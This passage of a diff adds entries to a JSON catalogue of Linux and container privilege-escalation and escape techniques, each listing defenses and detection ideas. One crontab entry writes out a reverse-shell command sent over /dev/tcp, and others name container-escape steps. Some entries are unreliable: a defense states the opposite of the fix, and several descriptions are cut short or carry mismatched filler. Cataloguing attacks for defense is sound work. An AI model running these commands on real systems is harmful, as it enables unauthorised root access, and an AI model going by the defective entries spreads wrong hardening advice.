+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2.",
+      "Investigate all scripts running under the root user. This includes scripts executed by low-privilege users via sudoers configuration, or scripts that are inherently running under the root user. 3.",
+      "Review the content of the scripts to determine whether any of the following commands, which may have a time difference in execution, are present. Additionally, the files being operated on or their parent directories must be controllable by low-privilege users. 1)",
+      "Unlocking a file, performing operations on the file, and then re-locking the file. There is a time difference between unlocking and re-locking. For example: chattr -i xxx; chmod 777 xxx; chattr +i xxx; 2)",
+      "After verifying a file (using a combination of commands such as find, or using if logical judgment)), performing operations on the file. There is a time difference between verification and operation. For example: find xxx -type f -exec chown service:service {} \\;",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse",
+      "TOCTOU Race Condition"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation",
+      "Exploit TOCTOU race condition between file verification and operation"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.4.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Root Crontab calls a script owned by a low-privilege user.",
+    "description": "Attackers can obtain low-privileged user rights and tamper with the script of scheduled tasks. After the script is executed periodically, privilege escalation occurs. For example: Assume that the Crontab invokes /tmp/foo.sh periodically. echo \"bash -i >& /dev/tcp/127.0.0.1/12345 0>&1\">/tmp/foo.sh After the task is executed, a bounce shell pops up",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "The script that will be called by the Crontab scheduled task must have write permissions for other users.",
+      "Restrict crontab ownership; monitor scheduled task modifications",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor the script invoked by the Crontab. This alarm is reported when the script is modified.",
+      "Alert on crontab modifications; monitor scheduled task script changes",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "ACL Abuse"
+    ],
+    "code_examples_patterns": [
+      "Tamper with world-writable crontab scripts for scheduled root execution"
+    ],
+    "related_tools": [
+      "http://isource.huawei.com/CloudEye/privilege_escalation_summary/tree/master",
+      "crontab -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.4.2.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Executable programs or scripts run by the root user can be edited by low-privilege users.",
+    "description": "Attackers obtain low-privilege user rights and tamper with executable programs or scripts. After the root user executes the programs or scripts, privilege escalation occurs. For example: In the preceding example, replace the executable file or script with the modified /tmp/foo.sh file",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Executable files or scripts executed by the root user should not have write permissions for other users.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "An executable program or script is executed by the root user. An alarm is reported when the program or script is modified.",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "http://isource.huawei.com/CloudEye/privilege_escalation_summary/tree/master"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.4.3.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "The root process or script uses files owned by a low-privilege user. > The root process or script reads or writes files (logs, configurations) owned by low-privilege users.",
+    "description": "An attacker who gains access to a low-privilege user account can tamper with relevant logs or configurations. By exploiting vulnerabilities in the root process script, the attacker can escalate privileges. For example: Assume the root process directly executes a command from the configuration script. By modifying the corresponding command in the configuration script, the attacker can achieve privilege escalation",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Executable files or scripts executed by the root user should not have write permissions for other users.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitors the logs or configuration files that are read by the root program and reports an alarm when the logs or configuration files are modified.",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "ACL Abuse"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "http://isource.huawei.com/CloudEye/privilege_escalation_summary/tree/master"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.4.3.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "The root process or script uses files owned by a low-privilege user. > The root process accesses the dynamic library owned by a low-privilege user.",
+    "description": "An attacker gains access to the permissions of a low-privilege user. This allows the attacker to tamper with the dynamic libraries of executable programs. After the Root process calls these libraries, privilege escalation is achieved",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "The dynamic library called by the Root process should not have write permissions for other low-privilege users.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitors the status of the dynamic library invoked by the root program and reports an alarm when the dynamic library is modified.",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "ACL Abuse",
+      "DLL Hijacking"
+    ],
+    "code_examples_patterns": [
+      "Inject malicious shared library via /etc/ld.so.preload for root execution"
+    ],
+    "related_tools": [
+      "http://isource.huawei.com/CloudEye/privilege_escalation_summary/tree/master"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.4.3.3",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "The root process or script uses files owned by a low-privilege user. > The root process or script uses high-risk commands to access files owned by low-privilege users.",
+    "description": "After a regular user's files are deleted, a soft link can be created to any root file. This allows the execution of high-risk commands on other root files",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Restrict the root process from using high-risk commands to access files owned by low-privilege users.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor files invoked by the root process and report alarms when high-risk commands are detected.",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "ACL Abuse"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "http://isource.huawei.com/CloudEye/privilege_escalation_summary/tree/master"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.4.3.4",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "The root process or script uses files owned by a low-privilege user. > The root process or script calls a script owned by a user with lower permissions.",
+    "description": "An attacker gains access to the permissions of a low-privilege user. This allows the attacker to tamper with executable programs or scripts. Once executed by the root user, this results in privilege escalation",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "The script called by the Root process. Other low-privilege users do not need to modify it, as they have write permissions.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitors the logs or configuration files that are read by the root program and reports an alarm when the logs or configuration files are modified.",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "ACL Abuse"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "http://isource.huawei.com/CloudEye/privilege_escalation_summary/tree/master"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.5.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Process Communication for Privilege Escalation > Exploiting Inter-Process Communication Pipes for Privilege Escalation",
+    "description": "Attackers can exploit the insufficient message validation vulnerability by using a pipe between a low-privilege process and a high-privilege process. To be supplemented",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Strictly verify the message format for inter-process communication.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "IPC Exploitation"
+    ],
+    "code_examples_patterns": [
+      "Exploit IPC channel with insufficient validation to escalate privileges"
+    ],
+    "related_tools": [
+      "5G E2E"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.5.1.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Process Communication for Privilege Escalation > Exploiting Message Queues/Shared Memory for Privilege Escalation",
+    "description": "View the system's message queue and shared memory. If the permissions are 666 or 777, a low-privilege user can construct a message and send it to a high-privilege user, thereby achieving privilege escalation. This can be directly achieved by executing binary commands as a low-privilege user in the background, which can be used to send messages and carry out attacks",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "IPC Exploitation"
+    ],
+    "code_examples_patterns": [
+      "Exploit IPC channel with insufficient validation to escalate privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.5.1.3",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Process Communication for Privilege Escalation > Exploiting the Microkernel Inter-Process Communication Interface for Privilege Escalation",
+    "description": "A high-privilege service program provides an IPC interface for other programs to access the services it offers. However, the implementation of the IPC interface has flaws, which can be exploited by low-privilege programs to gain elevated privileges through vulnerabilities in the IPC interface functions.",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "Patch management and timely kernel updates",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor for unusual kernel module loading (insmod, modprobe)",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "ExploitDB",
+      "searchsploit"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.5.2.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Environment Variables for Privilege Escalation",
+    "description": "A low-privilege program can modify the environment variables accessed by a high-privilege program, or the files pointed to by these environment variables. For example, modifying the PATH variable or traversing the directories specified in the PATH variable to access files",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Harden environment variable inheritance; use secure PATH configurations",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor PATH variable modifications; detect environment variable injection",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Inject malicious binaries into PATH directories for privilege escalation"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper Container Configuration for Escalation > Exploiting Privileged Containers for Escalation",
+    "description": "A privileged container is a container with all Capabilities enabled, which is equivalent to disabling all original isolation features of Docker. In practice, almost all operations that can be performed on host machines can be performed in the privileged container, which poses great risks.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Restrict the use of privileged containers and detect whether any existing containers are privileged containers.",
+      "Container deprivileging; restrict privileged containers",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.1.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper Container Configuration for Escalation > Exploiting Linux Capabilities for Escalation",
+    "description": "If the capability is enabled, the isolation mechanism between the container and the host machine is removed. Based on the enabled capability, attackers may escape from the container to the host machine.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container",
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Restrict the use of Capabilities and detect whether there are any containers within the existing ones that have activated dangerous Capabilities.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.1.3",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper Container Configuration for Escalation > Exploiting Docker.sock Mounting for Escalation",
+    "description": "When docker.sock is mounted to a container, attackers can access the socket in the container, manage the container through the Docker daemon, and create a privileged container to achieve privilege escalation. Principle: If docker.sock or containd.sock is mounted to the container, attackers can run CloudAutoDeploy-CDK to escape the container.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access",
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "Strictly inspect mounted files. It is strictly prohibited to mount sensitive system files of the host machine.",
+      "Restrict Docker socket access; implement container security policies",
+      "Audit mounted directories; prohibit sensitive host directory mounts",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Alert on Docker socket access from containers; monitor container creation events",
+      "Alert on new mount operations from within containers",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "DLL Hijacking",
+      "Container Escape",
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit Docker socket access to create privileged containers",
+      "Inject malicious shared library via /etc/ld.so.preload for root execution"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.1.4",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper Container Configuration for Escalation > Exploiting the host machine's /etc and /root directories for mounting and escape",
+    "description": "If key directories such as /etc and /root of the host machine are incorrectly mounted to the container, attackers can modify sensitive files of the host machine in the container to perform operations on the host machine to achieve persistence. Principle: If a host directory is mounted to a container, attackers can use CloudAutoDeploy-CDK to escape the container.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Strictly inspect the mounted directories. It is strictly prohibited to mount sensitive system directories of the host machine.",
+      "Audit mounted directories; prohibit sensitive host directory mounts",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Alert on new mount operations from within containers",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.2.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Docker Vulnerabilities for Escalation > Exploiting Runtime Vulnerabilities for Escape",
+    "description": "Runtime refers to the runtime dependency environment of a container. The existence of this component carries the potential for vulnerabilities. Attackers may exploit existing vulnerabilities to escape confinement. For example, CVE-2019-5736 in runc and CVE-2020-2024 in Kata Containers could all potentially provide attackers with the possibility of escaping",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Timely follow up on the latest vulnerability disclosures such as CVEs, and promptly perform version updates or apply patches as part of emergency response measures.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.2.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Docker Vulnerabilities for Escalation > Exploiting Engine Vulnerabilities for Escape",
+    "description": "The engine is a component that performs initial configuration for containers. The existence of this component may carry the risk of vulnerabilities. Attackers may exploit existing vulnerabilities to escape. For example, CVE-2019-14271 related to docker cp and CVE-2019-13139 related to docker build",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Timely follow up on the latest vulnerability disclosures such as CVEs, and promptly perform version updates or apply patches as part of emergency response measures.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.2.3",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Docker Vulnerabilities for Escalation > Exploiting the cgroup release_agent feature for escape",
+    "description": "Principle: If the cgroup release_agent feature is not restricted in the container, attackers can use the CloudAutoDeploy-CDK tool to escape the container. 1.",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Restrict access to the cgroup file system",
+      "Restrict cgroup filesystem access; disable release_agent where unnecessary",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor cgroup filesystem modifications; detect release_agent changes",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Manipulate cgroup release_agent or namespace configuration for container escape"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.2.4",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Docker Vulnerabilities for Escalation > Exploiting the Rewriting of the devices.allow File for Escalation",
+    "description": "1. Mount the devices subsystem of the host machine's cgroup inside the container. 2. Locate the current container's cgroup configuration, modify devices.allow to permit access to all devices. 3. Locate the master and slave device numbers of the storage device, and mount it for reading. 4. Access the file system via debugfs or after mounting with mount. 5. Use cdk for escape,./cdk run rewrite-cgroup-devices",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Restrict write access to the cgroup file system",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.2.5",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Docker Vulnerabilities for Escalation > Using core_pattern to Escape",
+    "description": "1. The /proc/sys/kernel/core_pattern file in the procfs file is used to configure the mode for exporting the dump data in the memory when the process breaks down.",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Restrict write access to core_pattern",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.2.6",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Docker Vulnerabilities for Escalation > Exploiting Shared Host Namespace",
+    "description": "1. Share the network namespace of the host. TCP/UDP ports and abstract Unix domain sockets listened locally by the attacker host Shared host PID namespace+SYS_PTRACE Using Process Injection to Escape",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "When starting a container, ensure that parameters such as --net=host, --pid=host, --ipc=host, --uts=host, or --mount=host are not used. These parameters can cause the container to share the corresponding namespace of the host machine.",
+      "Isolate container namespaces; avoid sharing host namespaces",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Detect namespace sharing violations; monitor PID/NET namespace access",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Manipulate cgroup release_agent or namespace configuration for container escape"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.2.7",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Docker Vulnerabilities for Escalation > Mounting the host machine's proc directory to achieve container escape",
+    "description": "Principle: If an attacker mounts the proc directory of the host machine, the attacker can use specific methods to escape the container. 1.",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Ensure that the container runs as a non-privileged user and does not have the permission to mount a file system.",
+      "Container deprivileging; restrict privileged containers",
+      "Audit mounted directories; prohibit sensitive host directory mounts",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Alert on new mount operations from within containers",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape",
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.2.8",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Docker Vulnerabilities for Escalation > Exploiting Historical Vulnerabilities to Achieve Container Escape (Containerization)",
+    "description": "Principle: If a container has a vulnerability, attackers can exploit the vulnerability to escape. 1. Share the network namespace of the host. TCP/UDP ports and abstract Unix domain sockets listened locally by the attacker host Shared host PID namespace+SYS_PTRACE Using Process Injection to Escape",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access",
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "Ensure that the container does not share the host's net network namespace.",
+      "Container deprivileging; restrict privileged containers",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.3.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Kubernetes Vulnerabilities for Escalation",
+    "description": "The K8s platform may have vulnerabilities, such as CVE-2018-1002105 of K8s. Attackers may exploit existing vulnerabilities to escape.",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Timely follow up on the latest vulnerability disclosures such as CVEs, and promptly perform version updates or apply patches as part of emergency response measures.",
+      "Implement strict RBAC policies; audit RoleBindings regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Audit Kubernetes API server logs for unauthorized RBAC changes",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "kubectl",
+      "CloudAutoDeploy-CDK"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.4.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Container Environment Variables for Escaping",
